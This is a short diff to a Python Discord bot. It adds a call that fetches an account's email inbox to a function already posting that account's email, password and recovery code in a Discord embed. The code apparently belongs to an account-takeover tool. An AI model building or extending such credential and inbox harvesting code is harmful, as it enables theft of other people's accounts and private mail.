@@ -4,6 +4,8 @@ from views.utils.securing.getLiveData import getLiveData
 from views.utils.securing.polishHost import polishHost
 from views.utils.securing.secure import secure
 
+from cogs.buttons.getInbox import getInbox
+
 from discord import Embed
 import httpx
 import time
@@ -78,7 +80,8 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
                 f"**Email:** {account["email"]}\n"
                 f"**Password:** {account["password"]}\n"
                 f"**Recovery Code:** {account["recoveryCode"]}"
-            )
+            ),
+            "account_inbox": await getInbox(account["email"])
         }
     }
     
